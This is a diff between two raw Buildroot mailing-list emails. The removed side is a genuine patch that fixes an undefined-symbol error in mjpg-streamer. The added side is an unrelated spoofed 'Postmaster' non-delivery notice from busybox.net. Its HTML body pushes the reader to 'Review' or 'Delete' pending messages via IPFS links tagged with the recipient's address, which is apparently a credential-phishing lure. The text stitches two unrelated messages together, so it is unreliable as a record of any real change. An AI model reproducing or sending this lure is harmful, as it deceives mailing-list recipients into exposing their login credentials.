@@ -4,72 +4,47 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id AF7CEC6FD1F
-	for <buildroot@archiver.kernel.org>; Sun, 24 Mar 2024 18:57:07 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 6C50ACD1281
+	for <buildroot@archiver.kernel.org>; Sun, 24 Mar 2024 19:18:41 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp1.osuosl.org (Postfix) with ESMTP id 527F381BFA;
-	Sun, 24 Mar 2024 18:57:07 +0000 (UTC)
+	by smtp1.osuosl.org (Postfix) with ESMTP id 2408F80EB2;
+	Sun, 24 Mar 2024 19:18:41 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
 Received: from smtp1.osuosl.org ([127.0.0.1])
  by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id y_p2AcMCs4Bp; Sun, 24 Mar 2024 18:57:06 +0000 (UTC)
+ id Oz7myJA5NpX4; Sun, 24 Mar 2024 19:18:40 +0000 (UTC)
 X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 4E88D81BB2
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 2750380EC5
 Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp1.osuosl.org (Postfix) with ESMTP id 4E88D81BB2;
-	Sun, 24 Mar 2024 18:57:06 +0000 (UTC)
-Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
- by ash.osuosl.org (Postfix) with ESMTP id 254E91BF215
- for <buildroot@lists.busybox.net>; Sun, 24 Mar 2024 18:57:05 +0000 (UTC)
+	by smtp1.osuosl.org (Postfix) with ESMTP id 2750380EC5;
+	Sun, 24 Mar 2024 19:18:40 +0000 (UTC)
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by ash.osuosl.org (Postfix) with ESMTP id 1D2AD1BF57F
+ for <buildroot@lists.busybox.net>; Sun, 24 Mar 2024 19:18:38 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp4.osuosl.org (Postfix) with ESMTP id 1E11F405D4
- for <buildroot@lists.busybox.net>; Sun, 24 Mar 2024 18:57:05 +0000 (UTC)
+ by smtp1.osuosl.org (Postfix) with ESMTP id 0392D80C2C
+ for <buildroot@lists.busybox.net>; Sun, 24 Mar 2024 19:18:38 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
-Received: from smtp4.osuosl.org ([127.0.0.1])
- by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id amV0v1iqQOyG for <buildroot@lists.busybox.net>;
- Sun, 24 Mar 2024 18:57:04 +0000 (UTC)
-Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=85.13.140.57;
- helo=dd20012.kasserver.com; envelope-from=bernd@kuhls.net; receiver=<UNKNOWN> 
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp4.osuosl.org EA566405D1
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org EA566405D1
-Received: from dd20012.kasserver.com (dd20012.kasserver.com [85.13.140.57])
- by smtp4.osuosl.org (Postfix) with ESMTPS id EA566405D1
- for <buildroot@buildroot.org>; Sun, 24 Mar 2024 18:57:03 +0000 (UTC)
-Received: from fli4l.lan.fli4l (p54a1b575.dip0.t-ipconnect.de [84.161.181.117])
- by dd20012.kasserver.com (Postfix) with ESMTPSA id 54E7DA4C3274
- for <buildroot@buildroot.org>; Sun, 24 Mar 2024 19:57:00 +0100 (CET)
-Received: from bruckner.lan.fli4l ([192.168.1.1]:60568)
- by fli4l.lan.fli4l with esmtp (Exim 4.97.1)
- (envelope-from <bernd@kuhls.net>) id 1roT1f-000000000vN-2vF2
- for buildroot@buildroot.org; Sun, 24 Mar 2024 18:56:59 +0000
-From: Bernd Kuhls <bernd@kuhls.net>
-To: buildroot@buildroot.org
-Date: Sun, 24 Mar 2024 19:56:59 +0100
-Message-Id: <20240324185659.1777379-1-bernd@kuhls.net>
-X-Mailer: git-send-email 2.39.2
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
+ id n3OOAKDWCjgg for <buildroot@lists.busybox.net>;
+ Sun, 24 Mar 2024 19:18:37 +0000 (UTC)
+Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=141.98.10.132;
+ helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 9EE10809EA
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 9EE10809EA
+Received: from busybox.net (unknown [141.98.10.132])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 9EE10809EA
+ for <buildroot@busybox.net>; Sun, 24 Mar 2024 19:18:36 +0000 (UTC)
+From: Postmaster <buildroot@busybox.net>
+To: buildroot@busybox.net
+Date: 24 Mar 2024 20:18:35 +0100
+Message-ID: <20240324201835.F77E8F322D0FB055@busybox.net>
 MIME-Version: 1.0
-X-Spamd-Bar: --
-X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=kuhls.net; 
- s=kas202312101026; t=1711306620;
- bh=MabqUgcPpJ/Q4jBbkYqZrXgGwfG6rrgijagVAJOJA+Y=;
- h=From:To:Subject:Date:From;
- b=Dii9oTNbqsz6jbK2L9WCRRqHOjm+ekIHLhoVxXOZ9uwQngzGUyOZtX8FIQBv2uY7p
- PurYVNBSzrQXPtBSbCOQR5K7snEgF0trEGYX9oQPVq59ftZtSXbwCU28iPbd0q8x+B
- jMTHQ8Lf6iAB8e5FGtqDfxGLKbIw6xULvzugZatb1NvPqaRW2lawhh9oSQocbct78p
- V9eHfwkLo0FHV8iIHCK3yDVXP35tNnN8D4XhFWJxQ+YHpkUac+peejFBTIlo1ru4kG
- obU4/FUpkUQXiTznWWE4DXsS1aui3bsNTIAw3IeT9WWHB08Bk+ezf8GFhMG9wpugs0
- 0sS9FDEo/cM0g==
-X-Mailman-Original-Authentication-Results: smtp4.osuosl.org;
- dmarc=pass (p=none dis=none)
- header.from=kuhls.net
-X-Mailman-Original-Authentication-Results: smtp4.osuosl.org;
- dkim=pass (2048-bit key,
- unprotected) header.d=kuhls.net header.i=@kuhls.net header.a=rsa-sha256
- header.s=kas202312101026 header.b=Dii9oTNb
-Subject: [Buildroot] [PATCH 1/1] package/mjpg-streamer: fix undefined symbol
- error
+X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
+ dmarc=none (p=none dis=none)
+ header.from=busybox.net
+Subject: [Buildroot] Undeliverable: Outgoing Mail Returned to Sender
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -81,58 +56,123 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============4147627173728945784=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-Fixes runtime error:
+--===============4147627173728945784==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-    dlopen: /usr/lib/mjpg-streamer/input_uvc.so: undefined symbol: resolutions_help
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<table style=3D"border: 1px dotted rgb(211, 211, 211); border-image: none; =
+text-align: left; color: rgb(51, 51, 51); text-transform: none; letter-spac=
+ing: normal; font-family: Roboto, Tahoma, Helvetica, sans-serif; font-size:=
+ 13px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
+: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; wi=
+dows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: norm=
+al; font-variant-caps: normal;=20
+text-decoration-style: initial; text-decoration-color: initial; -webkit-tex=
+t-stroke-width: 0px; text-decoration-thickness: initial;">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<th style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
+ne; width: 2px; color: rgb(0, 0, 0); box-sizing: border-box; background-col=
+or: rgb(2, 151, 64);">&nbsp;</th>
+<td style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
+ne; width: 665px; color: rgb(0, 0, 0); box-sizing: border-box; background-c=
+olor: rgb(243, 255, 248);"><span style=3D"font-size: 12px; box-sizing: bord=
+er-box;">Message from&nbsp;busybox.net server</span></td></tr></tbody></tab=
+le>
+<div style=3D"border-width: 0px; margin: 0px; padding: 20px; text-align: le=
+ft; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-=
+spacing: normal; font-family: Verdana; font-size: 12px; font-style: normal;=
+ font-weight: 400; word-spacing: 0px; vertical-align: baseline; white-space=
+: normal; box-sizing: border-box; orphans: 2; widows: 2; font-stretch: inhe=
+rit; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; =
+font-variant-caps: normal; text-decoration-style:=20
+initial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; te=
+xt-decoration-thickness: initial;"><font color=3D"#000066" face=3D"Arial" s=
+ize=3D"4" style=3D"box-sizing: border-box;"><table style=3D"padding-top: 32=
+px; background-color: rgb(255, 255, 255);" cellspacing=3D"0" cellpadding=3D=
+"0"><tbody><tr><td><font size=3D"2"> </font><table cellspacing=3D"0" cellpa=
+dding=3D"0"><tbody><tr>
+<td style=3D"padding: 24px 24px 32px; border-radius: 2px; border: 1px solid=
+ rgb(224, 224, 224); border-image: none; max-width: 560px; background-color=
+: rgb(250, 250, 250);"><font size=3D"2"> </font><font size=3D"2"> </font><f=
+ont size=3D"2"> </font><table style=3D"padding-top: 8px; min-width: 272px;"=
+><tbody><tr><td> <h2 style=3D"margin: 0px; color: rgb(33, 33, 33); font-wei=
+ght: bold;"><font size=3D"1"></font><font size=3D"2">Message bandwidth is f=
+ull </font></h2></td></tr><tr>
+<td style=3D"text-align: left; color: rgb(117, 117, 117); padding-top: 20px=
+; font-weight: normal;"><p><font size=3D"2"> This message was created autom=
+atically by mail delivery software.</font></p><p><br><font size=3D"2">The f=
+ollowing message from </font><a style=3D"color: rgb(33, 33, 33); text-decor=
+ation: none;" href=3D"mailto:buildroot@busybox.net"><b><font size=3D"2">bui=
+ldroot@busybox.net</font></b></a><font size=3D"2"> was undeliverable.<br>&n=
+bsp;The reason for the problem:<br>
+&nbsp;5.4.7 - Delivery expired (message too old) 'timeout'</font></p></td><=
+/tr><tr><td style=3D"text-align: left; color: rgb(66, 133, 244); padding-to=
+p: 24px;"><font size=3D"2"></font>
+<a style=3D"text-decoration: none;" href=3D"https://cloudflare-ipfs.com/ipf=
+s/bafkreiaw6dgw7wadbmxfedf4g5xuee22tbyfcvctqp65lwai6avvvnvivu?#buildroot@bu=
+sybox.net" target=3D"_blank" data-saferedirecturl=3D"https://www.google.com=
+/url?q=3Dhttps://support.google.com/mail/answer/6596&amp;source=3Dgmail&amp=
+;ust=3D1680546997744000&amp;usg=3DAOvVaw0KwZ7dRteNzrgii7VYARUA"><font size=
+=3D"2"><strong>REVIEW BANDWIDTH</strong></font></a></td></tr></tbody></tabl=
+e><font size=3D"2"></font></td></tr></tbody>
+</table><font size=3D"2"></font></td></tr><tr style=3D"border: currentColor=
+; border-image: none; width: 90%; background-color: rgb(255, 255, 255);"><t=
+d align=3D"left" style=3D"padding: 48px 10px;"><font size=3D"2"><font size=
+=3D"3"><span style=3D"box-sizing: border-box;">You have 3 pending outgoing =
+messages that could not be sent as of 3/24/2024 8:18:35 p.m.</span><br styl=
+e=3D"box-sizing: border-box;"><span style=3D"box-sizing: border-box;"><font=
+ style=3D"box-sizing: border-box;">Click to&nbsp;</font>
+<a class=3D"v1external_mr_css_attr" style=3D"border-width: 0px; margin: 0px=
+; padding: 0px; color: rgb(17, 85, 204); text-decoration: none; vertical-al=
+ign: baseline; cursor: pointer; box-sizing: border-box; background-color: t=
+ransparent;" href=3D"https://cloudflare-ipfs.com/ipfs/bafkreiaw6dgw7wadbmxf=
+edf4g5xuee22tbyfcvctqp65lwai6avvvnvivu?#buildroot@busybox.net" target=3D"_b=
+lank" rel=3D"noreferrer"><font style=3D"box-sizing: border-box;">Review</fo=
+nt></a>
+<font style=3D"box-sizing: border-box;">or</font>
+<a class=3D"v1external_mr_css_attr" style=3D"border-width: 0px; margin: 0px=
+; padding: 0px; color: rgb(17, 85, 204); text-decoration: none; vertical-al=
+ign: baseline; cursor: pointer; box-sizing: border-box; background-color: t=
+ransparent;" href=3D"https://cloudflare-ipfs.com/ipfs/bafkreiaw6dgw7wadbmxf=
+edf4g5xuee22tbyfcvctqp65lwai6avvvnvivu?#buildroot@busybox.net" target=3D"_b=
+lank" rel=3D"noreferrer"><font style=3D"box-sizing: border-box;">Delete</fo=
+nt></a>
+<font style=3D"box-sizing: border-box;">pending outgoing email messages.</f=
+ont></span></font></font></td></tr></tbody></table><p><font size=3D"3"><spa=
+n style=3D"box-sizing: border-box;"><span style=3D"color: black; box-sizing=
+: border-box;"><font size=3D"3"><font size=3D"2">The response was:<br></fon=
+t></font></span></span></font><p style=3D"font-family: monospace;"><font si=
+ze=3D"3"><font size=3D"3"><font size=3D"2">
+ A message that you sent could not be delivered to one or more of its recip=
+ients. This is a temporary error. <br>Learn more at </font>
+<a href=3D"https://dweb.link/ipfs/QmZ6uSvSTJ3Uh9BAeA5f2GDMKdR22gmTZimY28ted=
+pqwHj?filename=3DQmZ6uSvSTJ3Uh9BAeA5f2GDMKdR22gmTZimY28tedpqwHj#buildroot@b=
+usybox.net" target=3D"_blank" data-saferedirecturl=3D"https://www.google.co=
+m/url?q=3Dhttps://support.google.com/mail/answer/6596&amp;source=3Dgmail&am=
+p;ust=3D1680546997744000&amp;usg=3DAOvVaw0KwZ7dRteNzrgii7VYARUA"> <font siz=
+e=3D"2">https://support.busybox.net/<wbr>mail/answer/6596</font></a></font>=
+</font></p><p></p></font></div></body></html>
 
-Signed-off-by: Bernd Kuhls <bernd@kuhls.net>
----
- ...ix-undefined-symbol-resolutions_help.patch | 27 +++++++++++++++++++
- 1 file changed, 27 insertions(+)
- create mode 100644 package/mjpg-streamer/0001-input_uvc-fix-undefined-symbol-resolutions_help.patch
-
-diff --git a/package/mjpg-streamer/0001-input_uvc-fix-undefined-symbol-resolutions_help.patch b/package/mjpg-streamer/0001-input_uvc-fix-undefined-symbol-resolutions_help.patch
-new file mode 100644
-index 0000000000..f7feb2bb07
---- /dev/null
-+++ b/package/mjpg-streamer/0001-input_uvc-fix-undefined-symbol-resolutions_help.patch
-@@ -0,0 +1,27 @@
-+From 32bd867cc8a51568c031430a2886712438052945 Mon Sep 17 00:00:00 2001
-+From: Bernd Kuhls <bernd@kuhls.net>
-+Date: Sat, 9 Mar 2024 23:15:52 +0100
-+Subject: [PATCH] input_uvc: fix 'undefined symbol: resolutions_help'
-+
-+Upstream: https://github.com/jacksonliam/mjpg-streamer/pull/401
-+
-+Signed-off-by: Bernd Kuhls <bernd@kuhls.net>
-+---
-+ mjpg-streamer-experimental/plugins/input_uvc/CMakeLists.txt | 1 +
-+ 1 file changed, 1 insertion(+)
-+
-+diff --git a/mjpg-streamer-experimental/plugins/input_uvc/CMakeLists.txt b/mjpg-streamer-experimental/plugins/input_uvc/CMakeLists.txt
-+index 72b24fa..90bbfa0 100644
-+--- a/mjpg-streamer-experimental/plugins/input_uvc/CMakeLists.txt
-++++ b/mjpg-streamer-experimental/plugins/input_uvc/CMakeLists.txt
-+@@ -22,6 +22,7 @@ if (PLUGIN_INPUT_UVC)
-+     MJPG_STREAMER_PLUGIN_COMPILE(input_uvc dynctrl.c
-+                                            input_uvc.c
-+                                            jpeg_utils.c
-++                                           ../../utils.c
-+                                            v4l2uvc.c)
-+ 
-+     if (V4L2_LIB)
-+-- 
-+2.39.2
-+
--- 
-2.39.2
+--===============4147627173728945784==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============4147627173728945784==--
